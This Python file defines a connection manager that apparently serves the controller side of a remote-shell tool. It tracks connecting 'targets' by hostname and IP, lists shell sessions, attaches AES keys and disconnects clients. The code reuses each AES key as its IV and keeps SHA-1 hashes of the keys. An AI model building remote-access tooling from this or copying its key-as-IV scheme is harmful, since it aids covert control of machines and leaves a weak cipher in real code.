from os import urandom
from .Connection import Connection
import json
from hashlib import sha1


class ConnectionManager(object):

    def __init__(self):
        self.connections = {}
        self.connectedObjects = {}
        self.connctTo = None
        self.keys = []

    def insertNewConnction(self, conn, clientInfo):
        ip = conn.getpeername()[0]
        info = self._parseClientInfo(clientInfo,ip)
        if ip not in self.connections.keys(): 
            id = f"{info['Hostname']}:{ip}"
            self.connections[id] = info

    def connectToTarget(self,conn, id):
        conn.send(urandom(16))
        self.connections[id]['connected'] = True
        self.connectedObjects[id] = Connection(conn=conn,id=id)
        self.connctTo = None


    def _parseClientInfo(self,clientInfo, ip):
        return {**{'connected': False,'ip':ip},**json.loads(clientInfo)}
    

    def addAesToconnection(self,id, aesObj):
        aesObj.set_iv(aesObj.key)
        self.connectedObjects[id].aes = aesObj
        self.keys.append(sha1(aesObj.key))

    def removeConnection(self,id):
        del self.connections[id]
        
    def getFixedConnection(self,id):
        return self.connectedObjects[id]
    
    def isconnected(self,id):
        if id not in self.connections.keys():
            return False
        return self.connections[id]['connected']
    
    def getConnObj(self,id) -> Connection:
        return self.connectedObjects[id]
    
    def alive(self,id):
        return id in self.connections.keys()
    
    def getShellConntions(self):
        for i in self.connectedObjects.keys():
            print(f"id: {self.connectedObjects[i].id}")
        return [
            self.connectedObjects[i].id
            for i in self.connectedObjects.keys()
        ]
    
    def getId(self,clientInfo, ip):
        return f"{json.loads(clientInfo)['Hostname']}:{ip}"
    
    def disconnect(self,id):
        if id in self.connectedObjects.keys():
            self.getConnObj(id).sendMsg(b'exit')
            del self.connectedObjects[id]
        self.connections[id]['connected'] = False
        

